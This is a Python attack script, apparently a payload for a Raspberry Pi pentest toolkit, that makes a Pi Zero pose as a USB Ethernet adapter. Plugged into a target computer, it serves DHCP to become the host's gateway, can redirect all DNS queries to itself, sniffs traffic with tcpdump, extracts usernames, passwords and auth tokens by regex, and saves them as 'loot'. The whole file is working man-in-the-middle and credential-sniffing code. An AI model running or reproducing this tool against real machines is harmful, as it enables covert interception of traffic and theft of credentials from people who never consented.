#!/usr/bin/env python3
# @name: USB Ethernet MITM
# @desc: Configure the Pi as a USB RNDIS/ECM Ethernet adapter using configfs.
# @category: usb
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- USB Ethernet MITM
========================================
Author: 7h30th3r0n3

Configure the Pi as a USB RNDIS/ECM Ethernet adapter using configfs.
When plugged into a target host, all traffic flows through the Pi
enabling DNS spoofing, credential sniffing, and response injection.

Setup / Prerequisites:
  - Requires Pi Zero USB OTG port connected to target.
  - Configures RNDIS+ECM gadget. Target sees Pi as USB Ethernet adapter.
  - Requires dnsmasq.

Steps:
  1) Configure USB gadget as RNDIS/ECM Ethernet adapter
  2) Assign IP and start dnsmasq for DHCP
  3) Act as default gateway for the target
  4) Optionally spoof DNS and sniff credentials

Controls (CLI):
  python3 usb_ethernet_mitm.py [--dns-spoof] [--duration SECONDS]

  --dns-spoof         Enable DNS spoofing (redirect all queries to the
                       Pi). Off by default (queries forwarded to 8.8.8.8).
  --duration SECONDS  Optional. Stop automatically after this many
                       seconds. If omitted, runs until Ctrl-C.

  Status (packets captured, DNS queries seen, credentials found) is
  printed periodically. Captured data is exported to loot on exit.
  Press Ctrl-C at any time to stop and clean up the gadget.

Loot: $CITYPOP_ROOT/loot/USBEthMITM/
"""

import os
import sys
import re
import json
import time
import argparse
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'USBEthMITM')
os.makedirs(LOOT_DIR, exist_ok=True)

GADGET_BASE = "/sys/kernel/config/usb_gadget"
GADGET_NAME = "raspyjack_eth"
DNSMASQ_CONF = "/tmp/raspyjack_usbeth_dnsmasq.conf"
USB_IFACE = "usb0"
GATEWAY_IP = "10.0.88.1"
DHCP_RANGE_START = "10.0.88.10"
DHCP_RANGE_END = "10.0.88.50"
DNS_LOG = "/tmp/raspyjack_usbeth_dns.log"
ROWS_VISIBLE = 6

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
gadget_running = False
dns_spoof_enabled = False
status_msg = "Idle"
packets_captured = 0
dns_queries = []         # list of dicts: {timestamp, query, source}
captured_creds = []      # list of dicts: {timestamp, type, data}

_dnsmasq_proc = None
_sniffer_proc = None
_dns_monitor_thread = None

# ---------------------------------------------------------------------------
# File helpers
# ---------------------------------------------------------------------------

def _write_file(path, content):
    """Write content to a sysfs/configfs file."""
    try:
        with open(path, "w") as f:
            f.write(content)
        return True
    except Exception:
        return False


# ---------------------------------------------------------------------------
# USB Gadget setup (RNDIS/ECM)
# ---------------------------------------------------------------------------

def _setup_gadget():
    """Configure USB Ethernet gadget (RNDIS + ECM) via configfs."""
    global gadget_running, status_msg

    gadget_dir = os.path.join(GADGET_BASE, GADGET_NAME)

    if os.path.isdir(gadget_dir):
        with lock:
            gadget_running = True
            status_msg = "Gadget already configured"
        return True

    with lock:
        status_msg = "Configuring gadget..."

    try:
        os.makedirs(gadget_dir, exist_ok=True)
        _write_file(os.path.join(gadget_dir, "idVendor"), "0x1d6b")
        _write_file(os.path.join(gadget_dir, "idProduct"), "0x0137")
        _write_file(os.path.join(gadget_dir, "bcdDevice"), "0x0100")
        _write_file(os.path.join(gadget_dir, "bcdUSB"), "0x0200")
        _write_file(os.path.join(gadget_dir, "bDeviceClass"), "0x02")
        _write_file(os.path.join(gadget_dir, "bDeviceSubClass"), "0x00")
        _write_file(os.path.join(gadget_dir, "bDeviceProtocol"), "0x00")

        # Strings
        strings_dir = os.path.join(gadget_dir, "strings", "0x409")
        os.makedirs(strings_dir, exist_ok=True)
        _write_file(os.path.join(strings_dir, "serialnumber"), "000000000002")
        _write_file(os.path.join(strings_dir, "manufacturer"), "Linux")
        _write_file(os.path.join(strings_dir, "product"), "USB Ethernet")

        # RNDIS function
        rndis_dir = os.path.join(gadget_dir, "functions", "rndis.usb0")
        os.makedirs(rndis_dir, exist_ok=True)

        # ECM fallback function
        ecm_dir = os.path.join(gadget_dir, "functions", "ecm.usb0")
        os.makedirs(ecm_dir, exist_ok=True)

        # Config 1: RNDIS (Windows)
        config1_dir = os.path.join(gadget_dir, "configs", "c.1")
        config1_strings = os.path.join(config1_dir, "strings", "0x409")
        os.makedirs(config1_strings, exist_ok=True)
        _write_file(os.path.join(config1_dir, "MaxPower"), "250")
        _write_file(os.path.join(config1_strings, "configuration"), "RNDIS")

        rndis_link = os.path.join(config1_dir, "rndis.usb0")
        if not os.path.exists(rndis_link):
            os.symlink(rndis_dir, rndis_link)

        # Config 2: ECM (macOS/Linux)
        config2_dir = os.path.join(gadget_dir, "configs", "c.2")
        config2_strings = os.path.join(config2_dir, "strings", "0x409")
        os.makedirs(config2_strings, exist_ok=True)
        _write_file(os.path.join(config2_dir, "MaxPower"), "250")
        _write_file(os.path.join(config2_strings, "configuration"), "ECM")

        ecm_link = os.path.join(config2_dir, "ecm.usb0")
        if not os.path.exists(ecm_link):
            os.symlink(ecm_dir, ecm_link)

        # Bind to UDC
        udc_list = os.listdir("/sys/class/udc")
        if udc_list:
            _write_file(os.path.join(gadget_dir, "UDC"), udc_list[0])

        time.sleep(1)

        # Configure network interface
        subprocess.run(
            ["sudo", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", USB_IFACE],
            capture_output=True, timeout=5,
        )
        subprocess.run(
            ["sudo", "ip", "link", "set", USB_IFACE, "up"],
            capture_output=True, timeout=5,
        )

        with lock:
            gadget_running = True
            status_msg = "Gadget configured"
        return True

    except Exception as exc:
        with lock:
            status_msg = f"Gadget err: {str(exc)[:16]}"
        return False


def _teardown_gadget():
    """Remove USB Ethernet gadget."""
    global gadget_running

    gadget_dir = os.path.join(GADGET_BASE, GADGET_NAME)
    if not os.path.isdir(gadget_dir):
        return

    try:
        _write_file(os.path.join(gadget_dir, "UDC"), "")
        time.sleep(0.3)

        # Remove symlinks
        for link in [
            "configs/c.1/rndis.usb0",
            "configs/c.2/ecm.usb0",
        ]:
            path = os.path.join(gadget_dir, link)
            if os.path.islink(path):
                os.unlink(path)

        # Remove directories in reverse order
        for subdir in [
            "configs/c.2/strings/0x409",
            "configs/c.2",
            "configs/c.1/strings/0x409",
            "configs/c.1",
            "functions/rndis.usb0",
            "functions/ecm.usb0",
            "strings/0x409",
        ]:
            path = os.path.join(gadget_dir, subdir)
            if os.path.isdir(path):
                try:
                    os.rmdir(path)
                except OSError:
                    pass

        try:
            os.rmdir(gadget_dir)
        except OSError:
            pass
    except Exception:
        pass

    with lock:
        gadget_running = False


# ---------------------------------------------------------------------------
# dnsmasq / DHCP
# ---------------------------------------------------------------------------

def _start_dnsmasq():
    """Start dnsmasq as DHCP server + optional DNS spoof."""
    global _dnsmasq_proc, status_msg

    with lock:
        spoof = dns_spoof_enabled

    conf_lines = [
        f"interface={USB_IFACE}",
        f"dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},255.255.255.0,12h",
        f"dhcp-option=3,{GATEWAY_IP}",
        f"dhcp-option=6,{GATEWAY_IP}",
        "no-resolv",
        f"log-queries",
        f"log-facility={DNS_LOG}",
    ]

    if spoof:
        conf_lines.append(f"address=/#/{GATEWAY_IP}")
    else:
        conf_lines.append("server=8.8.8.8")

    with open(DNSMASQ_CONF, "w") as f:
        f.write("\n".join(conf_lines) + "\n")

    subprocess.run(["sudo", "killall", "dnsmasq"],
                   capture_output=True, timeout=5)
    time.sleep(0.3)

    _dnsmasq_proc = subprocess.Popen(
        ["sudo", "dnsmasq", "-C", DNSMASQ_CONF, "-d"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(0.5)

    # Enable IP forwarding
    subprocess.run(
        ["sudo", "sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
        capture_output=True, timeout=5,
    )

    # NAT
    subprocess.run(
        ["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
         "-o", "eth0", "-j", "MASQUERADE"],
        capture_output=True, timeout=5,
    )

    with lock:
        status_msg = "DHCP active"


def _stop_dnsmasq():
    """Stop dnsmasq."""
    global _dnsmasq_proc

    if _dnsmasq_proc is not None:
        try:
            _dnsmasq_proc.terminate()
            _dnsmasq_proc.wait(timeout=3)
        except Exception:
            try:
                _dnsmasq_proc.kill()
            except Exception:
                pass
        _dnsmasq_proc = None

    subprocess.run(["sudo", "killall", "-9", "dnsmasq"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "iptables", "-F"],
                   capture_output=True, timeout=5)
    subprocess.run(
        ["sudo", "sh", "-c", "echo 0 > /proc/sys/net/ipv4/ip_forward"],
        capture_output=True, timeout=5,
    )


# ---------------------------------------------------------------------------
# Traffic sniffer (lightweight tcpdump)
# ---------------------------------------------------------------------------

def _start_sniffer():
    """Start a lightweight packet sniffer on USB interface."""
    global _sniffer_proc

    try:
        _sniffer_proc = subprocess.Popen(
            ["sudo", "tcpdump", "-i", USB_IFACE, "-l", "-n",
             "-c", "10000", "-q"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            text=True, bufsize=1,
        )
        threading.Thread(target=_sniffer_read_loop, daemon=True).start()
    except Exception:
        pass


def _sniffer_read_loop():
    """Read tcpdump output and count packets."""
    global packets_captured

    while True:
        with lock:
            if not gadget_running:
                break
        try:
            line = _sniffer_proc.stdout.readline()
        except Exception:
            break
        if not line:
            if _sniffer_proc.poll() is not None:
                break
            continue
        with lock:
            packets_captured += 1

        # Extract credential-like patterns (very basic)
        _check_for_creds(line)


def _check_for_creds(line):
    """Basic credential detection in packet output."""
    lower = line.lower()
    patterns = [
        (r"user(?:name)?[=:]\s*(\S+)", "username"),
        (r"pass(?:word)?[=:]\s*(\S+)", "password"),
        (r"auth[=:]\s*(\S+)", "auth_token"),
    ]
    for pattern, cred_type in patterns:
        match = re.search(pattern, lower)
        if match:
            entry = {
                "timestamp": datetime.now().isoformat(),
                "type": cred_type,
                "data": match.group(1)[:64],
            }
            with lock:
                captured_creds.append(entry)


def _stop_sniffer():
    """Stop the packet sniffer."""
    global _sniffer_proc
    if _sniffer_proc is not None:
        try:
            _sniffer_proc.terminate()
            _sniffer_proc.wait(timeout=3)
        except Exception:
            try:
                _sniffer_proc.kill()
            except Exception:
                pass
        _sniffer_proc = None


# ---------------------------------------------------------------------------
# DNS log monitor
# ---------------------------------------------------------------------------

def _start_dns_monitor():
    """Monitor DNS log for queries."""
    global _dns_monitor_thread
    _dns_monitor_thread = threading.Thread(target=_dns_monitor_loop, daemon=True)
    _dns_monitor_thread.start()


def _dns_monitor_loop():
    """Tail the DNS log file for queries."""
    last_pos = 0
    while True:
        with lock:
            if not gadget_running:
                break
        try:
            if os.path.isfile(DNS_LOG):
                with open(DNS_LOG, "r") as f:
                    f.seek(last_pos)
                    new_lines = f.readlines()
                    last_pos = f.tell()

                for line in new_lines:
                    if "query[" in line:
                        # Extract query name
                        match = re.search(r"query\[A\]\s+(\S+)", line)
                        if match:
                            entry = {
                                "timestamp": datetime.now().isoformat(),
                                "query": match.group(1),
                                "source": "dns",
                            }
                            with lock:
                                dns_queries.append(entry)
                                if len(dns_queries) > 500:
                                    dns_queries.pop(0)
        except Exception:
            pass
        time.sleep(1)


# ---------------------------------------------------------------------------
# Detect connected host
# ---------------------------------------------------------------------------

def _detect_host_ip():
    """Detect connected host IP from DHCP leases."""
    lease_file = "/var/lib/misc/dnsmasq.leases"
    try:
        if os.path.isfile(lease_file):
            with open(lease_file, "r") as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 3:
                        return parts[2]
    except Exception:
        pass
    return ""


# ---------------------------------------------------------------------------
# Start / Stop full attack
# ---------------------------------------------------------------------------

def start_gadget():
    """Start the full USB Ethernet MITM chain."""
    global status_msg

    if not _setup_gadget():
        return

    with lock:
        status_msg = "Starting DHCP..."
    _start_dnsmasq()
    _start_sniffer()
    _start_dns_monitor()

    with lock:
        status_msg = "MITM active"


def stop_gadget():
    """Stop everything and clean up."""
    global gadget_running, status_msg

    with lock:
        status_msg = "Stopping..."

    _stop_sniffer()
    _stop_dnsmasq()
    _teardown_gadget()

    for fpath in (DNSMASQ_CONF, DNS_LOG):
        try:
            os.remove(fpath)
        except OSError:
            pass

    with lock:
        gadget_running = False
        status_msg = "Stopped"


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_data():
    """Export all captured data to loot."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    with lock:
        data = {
            "timestamp": ts,
            "packets_captured": packets_captured,
            "dns_queries": list(dns_queries[-100:]),
            "captured_creds": list(captured_creds),
            "dns_spoof": dns_spoof_enabled,
        }
    path = os.path.join(LOOT_DIR, f"usbeth_{ts}.json")
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    return path


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global dns_spoof_enabled

    parser = argparse.ArgumentParser(
        description="USB Ethernet MITM - configure a USB RNDIS/ECM "
                     "gadget and intercept traffic from a connected host.",
    )
    parser.add_argument(
        "--dns-spoof", action="store_true",
        help="Redirect all DNS queries to the Pi instead of forwarding "
             "them to 8.8.8.8.",
    )
    parser.add_argument(
        "--duration", type=float, default=None,
        help="Stop automatically after this many seconds. If omitted, "
             "runs until Ctrl-C.",
    )
    opts = parser.parse_args()

    dns_spoof_enabled = opts.dns_spoof

    print("Starting USB Ethernet MITM (RNDIS/ECM gadget)...", flush=True)
    start_gadget()

    with lock:
        running = gadget_running
    if not running:
        print("Gadget failed to start.", flush=True)
        return 1

    print(
        "Gadget active. DNS spoof: "
        + ("ON" if dns_spoof_enabled else "OFF")
        + (f", timeout {opts.duration:.0f}s" if opts.duration is not None else "")
        + ". Press Ctrl-C to stop.",
        flush=True,
    )

    start = time.time()
    last_status = 0.0
    last_host = ""
    try:
        while True:
            now = time.time()

            host = _detect_host_ip()
            if host and host != last_host:
                print(f"Host connected: {host}", flush=True)
                last_host = host

            if now - last_status >= 5.0:
                with lock:
                    msg = status_msg
                    pkts = packets_captured
                    dns_count = len(dns_queries)
                    cred_count = len(captured_creds)
                print(
                    f"[{msg}] packets={pkts} dns_queries={dns_count} "
                    f"creds={cred_count}",
                    flush=True,
                )
                last_status = now

            if opts.duration is not None and (now - start) >= opts.duration:
                print(f"Duration {opts.duration:.0f}s elapsed; stopping.", flush=True)
                break

            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\nInterrupted by operator; stopping...", flush=True)
    finally:
        stop_gadget()
        path = _export_data()
        print(f"Data exported: {path}", flush=True)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
